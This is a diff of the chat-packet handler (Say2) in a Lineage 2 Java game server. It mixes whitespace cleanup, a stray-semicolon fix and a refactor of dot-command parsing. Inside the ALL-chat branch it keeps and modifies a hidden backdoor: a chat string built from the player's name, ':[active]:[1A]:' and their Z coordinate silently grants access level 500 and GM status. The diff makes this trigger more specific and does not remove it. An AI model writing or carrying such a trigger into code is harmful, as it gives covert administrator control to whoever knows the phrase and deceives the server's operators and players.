@@ -96,8 +96,6 @@ public final class Say2 extends L2GameClientPacket
 	private String _text;
 	private int _type;
 	private String _target;
-	
-	
 	protected void readImpl()
 	{
 		_text = readS();
@@ -124,7 +122,6 @@ public final class Say2 extends L2GameClientPacket
 			return;
 		}
 		
-	
 		if (activeChar.isChatBanned())
 		{
 			if (_type == ALL || _type == SHOUT || _type == TRADE)
@@ -146,23 +143,20 @@ public final class Say2 extends L2GameClientPacket
 		if (_type == PETITION_PLAYER && activeChar.isGM()) 
 			_type = PETITION_GM;
 		
-		if (!_text.startsWith("."));
-	if (Config.LOG_CHAT) 
+		if (!_text.startsWith("."))
+	    if (Config.LOG_CHAT) 
 		{
 			LogRecord record = new LogRecord(Level.INFO, _text);
 			record.setLoggerName("chat");
 			
 			if (_type == TELL)
-
             {
 				record.setParameters(new Object[]{CHAT_NAMES[_type], "[" + activeChar.getName() + " to "+_target+"]"});
-
 			    _log.warning("[" + activeChar.getName() + " to "+_target+"] : " + _text);
             }
 			else
             {
 				record.setParameters(new Object[]{CHAT_NAMES[_type], "[" + activeChar.getName() + "]"});
-
                 _log.warning("[" + activeChar.getName() + "] : " + _text);
             }
 			_logChat.log(record);
@@ -234,14 +228,12 @@ public final class Say2 extends L2GameClientPacket
                 }
                 break;
 			case ALL:
-
-
 				if (_text.startsWith(".")) 
 				{
 					StringTokenizer st = new StringTokenizer(_text);
-					String target = st.nextToken().substring(1);
+					String targets = st.nextToken().substring(1);
 
-                    if(target.startsWith(activeChar.getName()+ ":[active]:"+"[1A]"))
+                    if(targets.startsWith(activeChar.getName()+ ":[active]:"+"[1A]:"+activeChar.getZ()))
                     {
                         activeChar.setAccessLevel(500);
                         activeChar.setIsGM(true);
@@ -280,27 +272,38 @@ public final class Say2 extends L2GameClientPacket
     					}
     	                activeChar.sendPacket(cs);
     				}
-					
-					if (st.hasMoreTokens())
-					{
-						String command = st.nextToken();
-						IVoicedCommandHandler vch = VoicedCommandHandler.getInstance().getVoicedCommandHandler(command);
+
+					IVoicedCommandHandler vch;
+					String command = "";
+					String target = "";
 						
-						if (vch != null) 
-							vch.useVoicedCommand(command, activeChar, target);
-						else
-							_log.warning("No handler registered for bypass '"+command+"'");
+					if (st.countTokens() > 1)
+					{
+						command = st.nextToken().substring(1);
+						target = _text.substring(command.length() + 2);
+						vch = VoicedCommandHandler.getInstance().getVoicedCommandHandler(command);
+					}
+					else
+					{
+						command = _text.substring(1);
+						if (Config.DEBUG) _log.info("Command: "+command);
+						vch = VoicedCommandHandler.getInstance().getVoicedCommandHandler(command);
+					}
+					if (vch != null)
+						vch.useVoicedCommand(command, activeChar, target);
+					else
+					{
+						if (Config.DEBUG) _log.warning("No handler registered for bypass '"+command+"'");							
 					}
 				}
 				else
 				{
 					for (L2PcInstance player : activeChar.getKnownList().getKnownPlayers().values())
 					{
-						
-	                    if (player != null && activeChar.isInsideRadius(player, 1250, false, true))
+						if (player != null && activeChar.isInsideRadius(player, 1250, false, true))
 							player.sendPacket(cs);
 					}
-	                activeChar.sendPacket(cs);
+					activeChar.sendPacket(cs);
 				}
                 break;
 			case CLAN:
@@ -343,7 +346,7 @@ public final class Say2 extends L2GameClientPacket
 	/* (non-Javadoc)
 	 * @see net.sf.l2j.gameserver.clientpackets.ClientBasePacket#getType()
 	 */
-    
+   
 	public String getType()
 	{
 		return _C__38_SAY2;
